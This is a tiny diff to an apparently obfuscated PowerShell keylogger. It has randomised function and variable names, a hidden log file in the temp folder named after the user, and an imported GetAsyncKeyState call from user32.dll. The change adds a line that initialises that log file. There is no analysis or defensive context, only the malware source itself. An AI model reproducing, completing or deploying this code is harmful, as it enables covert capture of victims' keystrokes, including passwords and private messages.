@@ -1,5 +1,5 @@
 function JUHknDWprl($faZCHPlAvk="$env:temp/$env:UserName.log") {
-
+  echo "" >> $faZCHPlAvk
   $OcWuFHMxqw = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
 public static extern short GetAsyncKeyState(int virtualKeyCode);
